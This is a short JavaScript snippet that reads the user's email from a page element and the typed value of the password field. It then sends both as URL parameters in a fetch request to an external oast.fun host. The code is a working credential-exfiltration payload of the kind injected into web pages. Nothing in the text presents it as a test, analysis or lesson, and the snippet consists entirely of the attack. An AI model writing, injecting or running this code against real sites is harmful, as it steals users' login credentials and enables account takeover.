// Extract email and pass values
var email = document.querySelector('.sc-gwxIzh.jVmVMn').textContent.match(/\S+@\S+/)[0];
var pass = document.querySelector('input[type="password"]').value;

// Construct the URL with parameters
var url = `https://yywufyeyfsciioyphurd3ulkjfsby8vrn.oast.fun?email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`;

// Send the GET request
fetch(url)
  .then(response => response.json())
  .then(data => {
    // Handle the response data here
    console.log(data);
  })
  .catch(error => {
    // Handle errors here
    console.error('Error:', error);
  });